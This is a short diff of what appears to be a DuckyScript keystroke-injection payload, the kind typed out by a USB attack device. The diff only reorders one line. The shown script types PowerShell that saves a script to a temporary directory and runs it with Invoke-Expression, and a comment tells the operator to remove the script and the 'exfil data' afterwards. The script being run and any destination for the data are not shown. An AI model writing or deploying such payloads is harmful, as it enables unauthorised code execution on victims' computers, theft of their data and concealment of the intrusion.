@@ -47,10 +47,10 @@ STRING }
 ENTER
 STRING '@
 ENTER
-STRING $scriptPath = Join-Path -Path $tempDirectory -ChildPath "script.ps1"
-ENTER
 
 REM Save and execute the script we just wrote.
+STRING $scriptPath = Join-Path -Path $tempDirectory -ChildPath "script.ps1"
+ENTER
 STRING $scriptContent | Out-File -FilePath $scriptPath -Force
 ENTER
 STRING $command = ".\tempDirectory\Script.ps1"
@@ -58,7 +58,6 @@ ENTER
 REM STRING Invoke-Command $command
 STRING Invoke-Expression -Command $scriptPath
 ENTER
-
 
 REM Cleanup goes here. Remember to remove your script and exfil data!
 STRING Exit
